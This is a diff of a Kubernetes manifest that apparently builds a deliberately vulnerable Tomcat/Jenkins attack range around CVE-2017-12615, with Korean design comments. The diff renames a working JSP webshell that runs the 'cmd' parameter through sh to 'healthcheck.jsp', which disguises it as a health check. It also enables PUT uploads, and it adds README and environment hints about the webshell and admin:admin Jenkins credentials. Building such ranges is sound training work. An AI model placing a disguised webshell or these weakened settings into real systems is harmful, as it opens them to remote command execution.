@@ -27,14 +27,17 @@ spec:
               cd /usr/local/tomcat/conf
               LINE=$(nl -ba web.xml | grep '<load-on-startup>1' | awk '{print $1}')
               sed -i "$LINE i <init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>" web.xml
-              # 운영 fallback webshell — PUT(CVE-2017-12615) 공격 재생성 비결정성에 대한 안전망.
-              # 공격자가 PUT 성공 시 이 파일을 덮어씀 → CVE-2017-12615 데모 보존.
-              # 공격자가 PUT 실패(중괄호 누락 등) 시 이 파일이 작동 → crown 반출 가능.
+              # 운영 health-check 엔드포인트(내부 admin 용 cmd 파라미터 포함).
+              # 공격자 shell.jsp PUT 깨짐 → fallback 덮어쓰기 → shell.jsp 500 패턴에 대한
+              # 구조적 안전망: healthcheck.jsp 는 공격자 PUT 경로(/shell.jsp/)와 다른 이름
+              # 이므로 PUT 로 덮어쓰이지 않음 → 라운드 내내 안정적으로 작동.
+              # 공격자 발견 유도: Tomcat env CORP_OPS_HEALTHCHECK_PATH + /opt/deploy/README.txt
+              # + KG corp-tomcat-putjsp.json step 2 description 세 경로로 안내.
               # 내용은 corp-tomcat-putjsp.json KG step 1 과 동일(BufferedReader 최소 중괄호).
               mkdir -p /usr/local/tomcat/webapps/ROOT
-              cat > /usr/local/tomcat/webapps/ROOT/shell.jsp << 'JSPEOF'
+              cat > /usr/local/tomcat/webapps/ROOT/healthcheck.jsp << 'HCEOF'
               <%@ page import="java.io.*" %><% BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")}).getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>
-              JSPEOF
+              HCEOF
               # 운영 안내 문서 — 공격자가 ls /opt/deploy/ 할 때 발견되는 미끼.
               # 실제 운영 환경에서도 "credentials live elsewhere" 안내는 흔한 패턴.
               # 설계 의도: 공격자가 Tomcat 발판에서 corp-db.properties 를 직접 cat 하려
@@ -64,6 +67,15 @@ spec:
               Note: /opt/deploy/corp-db.properties exists ONLY inside the Jenkins
               container. Do not try to cat it from this Tomcat host or via a URL —
               only Jenkins' own file.read() picks it up.
+
+              [Ops endpoint fallback]
+              If /shell.jsp returns 500 (e.g. after a bad JSP deploy has overwritten
+              it), a stable operational health-check endpoint is available at
+              /healthcheck.jsp on the same host, accepting the same ?cmd= parameter:
+
+                curl 'http://waf.corp-dmz.svc.cluster.local/healthcheck.jsp?cmd=id'
+
+              Use it as a drop-in replacement wrapping the Jenkins curl shown above.
               READMEEOF
               cd /usr/local/tomcat && exec bin/catalina.sh run
           ports:
@@ -80,6 +92,10 @@ spec:
               value: "/opt/deploy/corp-db.properties on Jenkins"
             - name: CORP_DEPLOY_SCRIPT_PATH
               value: "/opt/payload/crown-read.groovy on Jenkins"
+            - name: CORP_OPS_DOCS_PATH
+              value: "/opt/deploy/README.txt — Jenkins pivot via admin:admin"
+            - name: CORP_OPS_HEALTHCHECK_PATH
+              value: "/healthcheck.jsp — ops webshell fallback, same ?cmd= as shell.jsp"
           readinessProbe:
             tcpSocket: { port: 8080 }
             initialDelaySeconds: 15
